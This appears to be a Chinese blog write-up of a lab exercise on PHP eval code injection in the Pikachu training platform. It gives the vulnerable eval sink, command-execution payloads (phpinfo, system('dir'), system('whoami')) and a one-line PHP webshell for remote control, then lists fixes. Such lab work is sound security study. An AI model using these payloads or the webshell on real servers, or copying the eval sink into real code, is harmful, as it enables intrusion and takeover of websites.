---
title: Pikachu RCE exec eval 代码执行Writeup
date: 2026-10-30
category: Web安全
tags: [RCE, 代码执行, eval注入, Pikachu]
---
## 一、实验环境

靶场：Pikachu漏洞平台
页面地址：127.0.0.1/pikachu/vul/rce/rce_eval.php
漏洞类型：PHP代码执行漏洞（eval注入）

## 二、漏洞原理

后端核心代码：
@eval($_POST['txt']);
eval() 函数的作用：将传入的字符串直接当作PHP代码解析运行。
用户提交的输入没有过滤，直接送入eval函数，输入什么PHP代码就执行什么。
✅ 和ping命令注入区分：
ping：执行操作系统命令（system）
eval：执行PHP语言代码
## 三、实验步骤

1. 测试payload1（查看php信息）
输入框提交：
phpinfo();
提交后页面出现phpinfo页面，证明eval代码执行成功。

2. 测试payload2（调用系统命令，Windows）
system('dir');
提交后，输出当前目录文件列表。

3. 测试payload3（查看当前用户）
system('whoami');
4. 拓展：一句话木马
@eval($_POST['shell']);
作用：可以用蚁剑连接，获取网站webshell，控制网站。

## 四、漏洞危害

1. 攻击者可以执行任意PHP代码；

2. 调用system等函数执行系统命令，读取服务器文件；

3. 写入一句话木马，获取网站控制权。

五、修复方案

1. 禁止eval直接接收用户可控输入；

2. 业务必须动态执行代码时，使用白名单；

3. php.ini配置 disable_functions 禁用危险函数：system、exec、passthru、shell_exec；

4. 对用户输入做严格过滤。

